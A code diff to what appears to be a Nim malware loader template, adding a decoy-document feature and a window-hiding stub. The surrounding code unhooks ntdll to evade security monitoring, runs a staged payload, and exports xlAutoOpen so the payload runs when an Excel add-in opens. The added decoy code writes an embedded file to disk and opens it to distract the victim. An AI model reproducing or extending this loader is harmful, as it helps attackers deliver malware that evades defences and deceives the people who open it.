@@ -1,4 +1,6 @@
 import winim
+import winim/com
+
 when defined unhook:
   import ptr_math
 import std/strutils
@@ -75,7 +77,18 @@ when defined unhook:
           
 
 
-proc run() {.thread.} =
+proc run() {.thread, gcsafe.} =
+  when defined hidewindow:
+    # TODO: add window hiding (FindWindow+ShowWindow does not work for some reason)
+    echo "COMING SOON"
+
+  when defined decoy:
+    const asset = slurp("%DECOYPATH%")
+    write_file("%DECOYFILE%", asset)
+    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED or COINIT_DISABLE_OLE1DDE)
+
+    ShellExecute(NULL, "open", "%DECOYFILE%", NULL, NULL, SW_SHOWNORMAL);
+
   when defined unhook:
     ntdll_mapviewoffile()
   when defined staged:
@@ -138,7 +151,8 @@ proc run() {.thread.} =
 when defined excel:
   proc xlAutoOpen() {.stdcall, exportc, dynlib.} =
     var t: Thread[void]
-     
+    
+
     t.createThread(run)    
     joinThread(t)
   proc xlAutoAdd(): int {.stdcall, exportc, dynlib.} =
